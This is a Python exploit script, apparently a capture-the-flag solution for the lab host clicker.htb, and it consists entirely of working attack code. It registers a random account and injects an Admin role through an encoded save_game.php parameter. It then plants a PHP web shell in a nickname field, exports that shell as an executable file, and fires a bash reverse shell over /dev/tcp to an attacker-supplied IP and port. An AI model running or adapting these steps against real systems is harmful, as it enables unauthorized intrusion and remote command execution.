from urllib.parse import urljoin
import requests
import random
import re
import sys

your_ip, port = sys.argv[1], sys.argv[2]
url = "http://clicker.htb/"
s = requests.Session()
userpass = ''.join(c for c in (chr(random.randrange(97, 123)) for _ in range(5)))
data = {'username': userpass, 'password': userpass}

def register():
    print("Creating Your Account.")
    resp = s.post(url + "create_player.php", data=data)
    print(resp.status_code)
    print(f"Your Username & Password Are: {userpass}" if resp.status_code == 200 else "Something went wrong...")

def login():
    resp = s.post(url + "authenticate.php", data=data, allow_redirects=True)
    print("Successfully Logged In!" if resp.status_code == 200 else "Something went wrong...")

def get_admin():
    print("Attempting Administrative Access.")
    resp = s.get(url + "save_game.php?role%3d'Admin',clicks=0&level=0", allow_redirects=True)
    print("Successfully Gained Admin Access..." if resp.status_code == 200 else "Something went wrong...")

def login_as_admin():
    print("Getting You Into Your Admin Account")
    resp = s.get(url + "logout.php", allow_redirects=True)
    if resp.status_code == 200:
        login()
    else:
        print("Something Went Wrong...")

def creating_shell():
    print("Creating the shell")
    resp = s.get(url + "save_game.php?clicks=4&level=0&nickname=<%3fphp+system($_REQUEST['cmd'])%3b+%3f>", allow_redirects=True)
    if resp.status_code == 200:
        print("PHP shell successfully uploaded, attempting shell connection...")
        headers = {"Referer": "http://clicker.htb/admin.php"}
        data1 = {"threshold": "1000000", "extension": "php"}
        resp = s.post(url + "export.php", data=data1, headers=headers)
        if resp.status_code == 200:
            match = re.search(r"exports/top_players_\w+\.php", resp.text)
            if match:
                endpoint = match.group(0) + f"?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/{your_ip}/{port}%200%3E%261%27"
                s.get(urljoin(url, endpoint))
                print("Enjoy your shell!")
            else:
                print("Something went wrong...")
register()
login()
get_admin()
login_as_admin()
creating_shell()
